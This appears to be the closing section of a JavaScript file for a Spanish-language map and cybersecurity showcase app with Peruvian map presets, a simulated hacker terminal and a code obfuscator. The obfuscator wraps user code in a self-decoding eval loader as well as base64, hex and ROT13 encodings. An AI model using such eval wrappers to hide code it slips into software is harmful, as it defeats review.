  function populateCyberLanguages() {
    const grid = document.getElementById('cyber-languages-grid');
    if (!grid) return;
    grid.innerHTML = '';

    CYBER_LANGS.forEach(lang => {
      const card = document.createElement('div');
      card.className = `language-card ${lang.id === activeCyberLang ? 'active' : ''}`;
      card.dataset.lang = lang.id;

      // Icon classes mapping
      let iconClass = 'fa-code';
      if (lang.id === 'python') iconClass = 'fa-brands fa-python text-cyan';
      else if (lang.id === 'c') iconClass = 'fa-solid fa-microchip text-purple';
      else if (lang.id === 'javascript') iconClass = 'fa-brands fa-square-js text-gold';
      else if (lang.id === 'sql') iconClass = 'fa-solid fa-database text-green';
      else if (lang.id === 'bash') iconClass = 'fa-solid fa-terminal text-muted';
      else if (lang.id === 'powershell') iconClass = 'fa-solid fa-gears text-cyan';
      else if (lang.id === 'ruby') iconClass = 'fa-solid fa-gem text-red';
      else if (lang.id === 'assembly') iconClass = 'fa-solid fa-memory text-gold';

      // Build Difficulty Indicators
      let dotsHtml = '';
      for (let i = 1; i <= 3; i++) {
        let activeClass = '';
        if (i <= lang.diff) {
          if (lang.diff === 1) activeClass = 'dot-active-green';
          else if (lang.diff === 2) activeClass = 'dot-active-yellow';
          else activeClass = 'dot-active-red';
        }
        dotsHtml += `<span class="diff-dot ${activeClass}"></span>`;
      }

      card.innerHTML = `
        <div class="lang-icon-row">
          <div class="lang-icon-badge"><i class="${iconClass}"></i></div>
          <div class="diff-indicator-row" title="Dificultad: ${lang.diff === 1 ? 'Fácil' : lang.diff === 2 ? 'Media' : 'Avanzada'}">
            ${dotsHtml}
          </div>
        </div>
        <div class="lang-title">${lang.name}</div>
        <div class="lang-meta-tag">${lang.category}</div>
        <div class="lang-desc">${lang.desc}</div>
      `;

      card.addEventListener('click', () => {
        playSound('click');
        activeCyberLang = lang.id;
        document.querySelectorAll('.language-card').forEach(c => c.classList.remove('active'));
        card.classList.add('active');
        loadLanguageToTerminal(lang);
      });

      grid.appendChild(card);
    });
  }

  function loadLanguageToTerminal(lang) {
    if (!lang) return;
    const titleTag = document.getElementById('terminal-lang-tag');
    const termBody = document.getElementById('hacker-terminal-body');
    if (titleTag) titleTag.textContent = `${lang.name.substring(3)} Console`;
    if (termBody) {
      termBody.innerHTML = `
        <div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> cat script.${lang.ext}</div>
        <div class="terminal-line text-muted">${escapeHtml(lang.snippet)}</div>
        <div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> _</div>
      `;
    }
  }

  function runTerminalCode() {
    const langObj = CYBER_LANGS.find(l => l.id === activeCyberLang);
    if (!langObj) return;

    playSound('complete');
    const termBody = document.getElementById('hacker-terminal-body');
    if (!termBody) return;

    // Add run commands and fake compiling
    const lines = termBody.innerHTML.split('<div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> _</div>');
    let outputHtml = lines[0];

    outputHtml += `
      <div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> compile_and_run script.${langObj.ext}</div>
      <div class="terminal-line text-cyan">[!] Cargando compilador...</div>
      <div class="terminal-line text-cyan">[!] Ejecutando código en Sandbox Segura...</div>
      <div class="terminal-line text-green">${escapeHtml(langObj.output).replace(/\n/g, '<br>')}</div>
      <div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> _</div>
    `;

    termBody.innerHTML = outputHtml;
    termBody.scrollTop = termBody.scrollHeight;
  }

  // HTML escape helper
  function escapeHtml(text) {
    if (!text) return '';
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  // Code Obfuscation Logic (Standard, Hex, ROT13, Custom eval)
  function obfuscateInputCode() {
    const inputTextArea = document.getElementById('cyber-code-input');
    const outputTextArea = document.getElementById('cyber-code-output');
    const typeSelect = document.getElementById('cyber-obfuscate-type');
    if (!inputTextArea || !outputTextArea || !typeSelect) return;

    const code = inputTextArea.value.trim();
    if (!code) {
      outputTextArea.value = "Por favor, escribe código fuente en la caja superior.";
      return;
    }

    playSound('complete');
    const method = typeSelect.value;
    let obfuscatedResult = '';

    if (method === 'base64') {
      obfuscatedResult = btoa(unescape(encodeURIComponent(code)));
    } else if (method === 'hex') {
      obfuscatedResult = code.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('\\x');
      obfuscatedResult = '\\x' + obfuscatedResult;
    } else if (method === 'rot13') {
      obfuscatedResult = rot13(code);
    } else if (method === 'custom-eval') {
      const b64 = btoa(unescape(encodeURIComponent(code)));
      obfuscatedResult = `/* OFUSCADO POR CYBER STUDIO CARCAMO - RUNTIME EXECUTE */\n(function(_){eval(decodeURIComponent(escape(atob(_))))})("${b64}");`;
    }

    outputTextArea.value = obfuscatedResult;

    // Glowing animation trigger
    outputTextArea.style.borderColor = 'var(--accent-cyan)';
    outputTextArea.style.boxShadow = '0 0 15px var(--accent-cyan-glow)';
    setTimeout(() => {
      outputTextArea.style.borderColor = 'rgba(16, 185, 129, 0.3)';
      outputTextArea.style.boxShadow = 'none';
    }, 1000);
  }

  function decodeOutputCode() {
    const inputTextArea = document.getElementById('cyber-code-input');
    const outputTextArea = document.getElementById('cyber-code-output');
    const typeSelect = document.getElementById('cyber-obfuscate-type');
    if (!inputTextArea || !outputTextArea || !typeSelect) return;

    const obfuscated = outputTextArea.value.trim();
    if (!obfuscated) return;

    playSound('step');
    const method = typeSelect.value;
    let decoded = '';

    try {
      if (method === 'base64') {
        decoded = decodeURIComponent(escape(atob(obfuscated)));
      } else if (method === 'hex') {
        const hexStr = obfuscated.replace(/\\x/g, '');
        const bytes = [];
        for (let i = 0; i < hexStr.length; i += 2) {
          bytes.push(parseInt(hexStr.substr(i, 2), 16));
        }
        decoded = String.fromCharCode.apply(null, bytes);
      } else if (method === 'rot13') {
        decoded = rot13(obfuscated);
      } else if (method === 'custom-eval') {
        const match = obfuscated.match(/\("([^"]+)"\)/);
        if (match && match[1]) {
          decoded = decodeURIComponent(escape(atob(match[1])));
        } else {
          decoded = "Error: El formato de eval custom no es válido.";
        }
      }
      inputTextArea.value = decoded;
    } catch (e) {
      outputTextArea.value = `[!] Error de Descodificación: Asegúrate de seleccionar el algoritmo correcto.`;
    }
  }

  // Clean mathematical ROT13 shifter
  function rot13(str) {
    if (!str) return '';
    return str.replace(/[a-zA-Z]/g, function(c) {
      const code = c.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        return String.fromCharCode(((code - 65 + 13) % 26) + 65);
      } else if (code >= 97 && code <= 122) {
        return String.fromCharCode(((code - 97 + 13) % 26) + 97);
      }
      return c;
    });
  }

  // --- EVENT LISTENERS BINDING ---

  // Module Switchers (Geo vs Cyber)
  const btnModGeo = document.getElementById('btn-module-geo');
  const btnModCyber = document.getElementById('btn-module-cyber');

  const sidebarGeo = document.getElementById('sidebar-geo-module');
  const sidebarCyber = document.getElementById('sidebar-cyber-module');

  const viewportGeo = document.getElementById('viewport-geo-module');
  const viewportCyber = document.getElementById('viewport-cyber-module');

  if (btnModGeo && btnModCyber) {
    btnModGeo.addEventListener('click', () => {
      playSound('click');
      activeModule = 'geo';
      btnModGeo.classList.add('active');
      btnModCyber.classList.remove('active');

      if (sidebarGeo) sidebarGeo.classList.add('active-module');
      if (sidebarCyber) sidebarCyber.classList.remove('active-module');

      if (viewportGeo) viewportGeo.classList.add('active-module');
      if (viewportCyber) viewportCyber.classList.remove('active-module');

      document.querySelectorAll('.id-geo-only').forEach(el => el.style.display = 'flex');

      // Trigger map layout refresh
      if (leafletMap) {
        setTimeout(() => leafletMap.invalidateSize(), 100);
      }
    });

    btnModCyber.addEventListener('click', () => {
      playSound('click');
      activeModule = 'cyber';
      btnModCyber.classList.add('active');
      btnModGeo.classList.remove('active');

      if (sidebarCyber) sidebarCyber.classList.add('active-module');
      if (sidebarGeo) sidebarGeo.classList.remove('active-module');

      if (viewportCyber) viewportCyber.classList.add('active-module');
      if (viewportGeo) viewportGeo.classList.remove('active-module');

      document.querySelectorAll('.id-geo-only').forEach(el => el.style.display = 'none');
    });
  }

  // Preset Card Clicks
  document.querySelectorAll('.preset-card').forEach(card => {
    card.addEventListener('click', () => {
      playSound('click');
      const pid = parseInt(card.dataset.preset);
      selectPreset(pid);
    });
  });

  // Type Switcher Tabs
  document.querySelectorAll('.tab-btn').forEach(tab => {
    tab.addEventListener('click', () => {
      playSound('click');
      document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      activeType = tab.dataset.type;

      const label = document.getElementById('label-query');
      const input = document.getElementById('input-query');
      if (activeType === 'direct') {
        if (label) label.innerHTML = `<i class="fa-solid fa-magnifying-glass"></i> Ingresa Dirección o Nombre de Lugar:`;
        if (input) input.placeholder = "Ej: Plaza de Armas de Paita, Piura";
      } else {
        if (label) label.innerHTML = `<i class="fa-solid fa-location-crosshairs"></i> Ingresa Coordenadas GPS (Lat, Lng):`;
        if (input) input.placeholder = "Ej: -5.1945, -80.6328";
      }
    });
  });

  // Run Button Click & Enter Key
  const btnRun = document.getElementById('btn-run-simulation');
  const inputQuery = document.getElementById('input-query');
  if (btnRun) btnRun.addEventListener('click', runCustomSearch);
  if (inputQuery) {
    inputQuery.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') runCustomSearch();
    });
  }

  // View Switchers (2D Satellite vs 3D Globe)
  const btn2d = document.getElementById('btn-view-2d');
  const btn3d = document.getElementById('btn-view-3d');

  if (btn2d) {
    btn2d.addEventListener('click', () => {
      playSound('click');
      activeView = '2d';
      btn2d.classList.add('active');
      if (btn3d) btn3d.classList.remove('active');
      const lCont = document.getElementById('leaflet-container');
      const gCont = document.getElementById('globe-container');
      if (lCont) lCont.classList.add('active-view');
      if (gCont) gCont.classList.remove('active-view');
      if (leafletMap) {
        setTimeout(() => leafletMap.invalidateSize(), 50);
      }
    });
  }

  if (btn3d) {
    btn3d.addEventListener('click', () => {
      playSound('click');
      activeView = '3d';
      btn3d.classList.add('active');
      if (btn2d) btn2d.classList.remove('active');
      const gCont = document.getElementById('globe-container');
      const lCont = document.getElementById('leaflet-container');
      if (gCont) gCont.classList.add('active-view');
      if (lCont) lCont.classList.remove('active-view');
    });
  }

  // Open Gallery Button Click inside Card
  const btnGallery = document.getElementById('btn-open-gallery');
  if (btnGallery) {
    btnGallery.addEventListener('click', () => {
      playSound('click');
      openPhotoGallery();
    });
  }

  // Open Street View 360 Button Click inside Card
  const btnSV = document.getElementById('btn-open-streetview');
  const svModal = document.getElementById('streetview-modal');
  const svIframe = document.getElementById('streetview-iframe');
  const svTitle = document.getElementById('streetview-modal-title');
  const btnCloseSV = document.getElementById('btn-close-streetview');

  if (btnSV && svModal && svIframe) {
    btnSV.addEventListener('click', () => {
      playSound('click');
      const p = PRESETS[activePreset] || PRESETS[1];
      if (svTitle) {
        svTitle.innerHTML = `<i class="fa-solid fa-street-view text-cyan"></i> Vista 360° Interactiva: ${p.title}`;
      }
      svIframe.src = p.streetviewUrl || `https://maps.google.com/maps?q=&layer=c&cbll=${p.lat},${p.lng}&cbp=11,0,0,0,0&output=embed`;
      svModal.classList.remove('hidden');
    });
  }

  if (btnCloseSV && svModal && svIframe) {
    btnCloseSV.addEventListener('click', () => {
      svModal.classList.add('hidden');
      svIframe.src = ''; // Clear source to stop network overhead
    });
  }

  if (svModal && svIframe) {
    svModal.addEventListener('click', (e) => {
      if (e.target === svModal) {
        svModal.classList.add('hidden');
        svIframe.src = '';
      }
    });
  }

  // Sound Toggle
  const btnSound = document.getElementById('btn-sound-toggle');
  if (btnSound) {
    btnSound.addEventListener('click', () => {
      soundEnabled = !soundEnabled;
      btnSound.innerHTML = soundEnabled ? `<i class="fa-solid fa-volume-high"></i>` : `<i class="fa-solid fa-volume-xmark"></i>`;
    });
  }

  // Quick Jump HUD Buttons (Paita, Piura, Lima)
  const btnPaita = document.getElementById('btn-reset-paita');
  const btnPiura = document.getElementById('btn-reset-piura');
  const btnLima = document.getElementById('btn-reset-lima');

  if (btnPaita) btnPaita.addEventListener('click', () => { playSound('click'); selectPreset(2); });
  if (btnPiura) btnPiura.addEventListener('click', () => { playSound('click'); selectPreset(3); });
  if (btnLima) btnLima.addEventListener('click', () => { playSound('click'); selectPreset(4); });

  // Theory Modal
  const modal = document.getElementById('theory-modal');
  const btnInfo = document.getElementById('btn-info-modal');
  const btnCloseModal = document.getElementById('btn-close-modal');

  if (btnInfo && modal) {
    btnInfo.addEventListener('click', () => {
      playSound('click');
      modal.classList.remove('hidden');
    });
  }
  if (btnCloseModal && modal) {
    btnCloseModal.addEventListener('click', () => modal.classList.add('hidden'));
  }
  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) modal.classList.add('hidden');
    });
  }

  // Gallery Modal Close
  const galleryModal = document.getElementById('gallery-modal');
  const btnCloseGallery = document.getElementById('btn-close-gallery');

  if (btnCloseGallery && galleryModal) {
    btnCloseGallery.addEventListener('click', () => galleryModal.classList.add('hidden'));
  }
  if (galleryModal) {
    galleryModal.addEventListener('click', (e) => {
      if (e.target === galleryModal) galleryModal.classList.add('hidden');
    });
  }

  // Location Card Close
  const btnCloseCard = document.getElementById('btn-close-card');
  const locationCard = document.getElementById('location-card');
  if (btnCloseCard && locationCard) {
    btnCloseCard.addEventListener('click', () => locationCard.classList.add('hidden'));
  }

  // Escape key handler to close all open modals
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (modal) modal.classList.add('hidden');
      if (galleryModal) galleryModal.classList.add('hidden');
      if (svModal) {
        svModal.classList.add('hidden');
        svIframe.src = '';
      }
    }
  });

  // Window resize handler for Leaflet and Globe
  window.addEventListener('resize', () => {
    if (leafletMap) leafletMap.invalidateSize();
  });

  // Obfuscator Buttons Event Listeners
  const btnObfuscate = document.getElementById('btn-cyber-obfuscate');
  const btnDecode = document.getElementById('btn-cyber-decode');
  const btnCopy = document.getElementById('btn-copy-output');

  if (btnObfuscate) btnObfuscate.addEventListener('click', obfuscateInputCode);
  if (btnDecode) btnDecode.addEventListener('click', decodeOutputCode);
  if (btnCopy) {
    btnCopy.addEventListener('click', () => {
      const output = document.getElementById('cyber-code-output');
      if (output && output.value.trim()) {
        playSound('click');
        const text = output.value;
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(text);
        } else {
          // Fallback selection copy for file:/// protocol
          const textarea = document.createElement('textarea');
          textarea.value = text;
          textarea.style.position = 'fixed';
          document.body.appendChild(textarea);
          textarea.focus();
          textarea.select();
          try {
            document.execCommand('copy');
          } catch (err) {
            console.warn('Fallback copy failed', err);
          }
          document.body.removeChild(textarea);
        }
        
        btnCopy.innerHTML = `<i class="fa-solid fa-check text-green"></i> Copiado!`;
        setTimeout(() => {
          btnCopy.innerHTML = `<i class="fa-solid fa-copy"></i> Copiar`;
        }, 1500);
      }
    });
  }

  // Hacker Terminal simulator buttons
  const btnTerminalRun = document.getElementById('btn-run-terminal-code');
  const btnTerminalClear = document.getElementById('btn-clear-terminal');

  if (btnTerminalRun) btnTerminalRun.addEventListener('click', runTerminalCode);
  if (btnTerminalClear) {
    btnTerminalClear.addEventListener('click', () => {
      playSound('click');
      const termBody = document.getElementById('hacker-terminal-body');
      if (termBody) {
        termBody.innerHTML = `
          <div class="terminal-line"><span class="t-prompt">guest@carcamo_sec:~$</span> _</div>
        `;
      }
    });
  }

  // --- BOOTSTRAP INITIALIZATION ---
  initLeafletMap();
  initGlobe();

  // Load Cybersecurity data
  populateCyberLanguages();
  loadLanguageToTerminal(CYBER_LANGS[0]);

  // Instantly run preset 1 on initial boot
  setTimeout(() => {
    selectPreset(1);
  }, 100);

});
